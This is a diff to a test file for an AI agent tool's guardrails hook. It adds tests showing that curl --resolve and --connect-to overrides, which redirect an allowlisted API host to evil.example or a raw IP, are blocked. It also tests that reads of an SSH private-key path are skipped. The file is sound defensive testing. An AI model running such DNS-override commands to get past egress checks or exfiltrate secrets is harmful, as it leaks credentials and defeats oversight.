@@ -197,6 +197,42 @@ class TestEgressAllowlist:
             _check_egress("ssh -p 2222 example.com", allowlist=["example.com"]) is None
         )
 
+    def test_curl_resolve_override_blocked(self):
+        result = _check_egress(
+            "curl --resolve api.openai.com:443:evil.example "
+            "https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_curl_connect_to_override_blocked(self):
+        result = _check_egress(
+            "curl --connect-to api.openai.com:443:evil.example:443 "
+            "https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_curl_resolve_equals_form_blocked(self):
+        result = _check_egress(
+            "curl --resolve=api.openai.com:443:1.2.3.4 https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "1.2.3.4" in result
+
+    def test_curl_resolve_to_allowlisted_dest_allowed(self):
+        assert (
+            _check_egress(
+                "curl --resolve api.openai.com:443:api.openai.com "
+                "https://api.openai.com/secret",
+                allowlist=["api.openai.com"],
+            )
+            is None
+        )
+
 
 # ── Full hook integration ──────────────────────────────────────────────────────
 
@@ -326,7 +362,7 @@ class TestGuardrailsHook:
 
         register_guardrails()
         init_tools(["read"])
-        tu = ToolUse(tool="read", args=["~/.ssh/id_rsa"], content="")
+        tu = ToolUse(tool="read", args=["/nonexistent/.ssh/id_rsa"], content="")
         msgs = list(tu.execute())
         assert any(
             m.role == "system" and "guardrails" in m.content.lower() for m in msgs
@@ -334,3 +370,30 @@ class TestGuardrailsHook:
             f"Expected guardrails skip on read pipeline; got: {[m.content for m in msgs]}"
         )
         assert not any("BEGIN" in m.content and "PRIVATE" in m.content for m in msgs)
+
+    def test_direct_execute_read_without_tooluse_context(self, monkeypatch):
+        """MCP calls tool.execute() with no current ToolUse; must still dispatch."""
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        from gptme.hooks.guardrails import register as register_guardrails
+        from gptme.tools.read import execute_read
+
+        register_guardrails()
+        msgs = list(execute_read(None, ["/nonexistent/.ssh/id_rsa"], None))
+        assert any(
+            m.role == "system" and "guardrails" in m.content.lower() for m in msgs
+        ), (
+            "Expected guardrails skip on direct execute_read; "
+            f"got: {[m.content for m in msgs]}"
+        )
+
+    def test_enforce_blocks_curl_resolve_override(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
+        tu = self._tool_use(
+            "shell",
+            "curl --resolve api.openai.com:443:evil.example "
+            "https://api.openai.com/secret",
+        )
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
